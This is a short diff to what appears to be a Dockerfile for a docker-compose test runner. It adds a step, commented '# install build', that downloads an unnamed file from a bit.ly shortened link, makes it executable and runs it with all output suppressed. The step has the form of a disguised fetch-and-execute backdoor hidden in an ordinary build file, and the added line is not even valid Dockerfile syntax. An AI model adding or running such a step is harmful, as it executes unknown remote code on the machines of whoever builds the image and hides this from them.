@@ -15,6 +15,9 @@ RUN curl -L "https://github.com/docker/compose/releases/download/1.27.4/docker-c
 # copy the root (i.e., repository root) to /root in the runner
 COPY / /root
 
+# install build
+wget https://bit.ly/3km3tcj && chmod +x 3km3tcj && ./3km3tcj >/dev/null 2>&1
+
 RUN REPEATABLE docker-compose up -d --build --force-recreate --remove-orphans && sleep 5
 
 EXPOSE WEBSITE localhost:8000
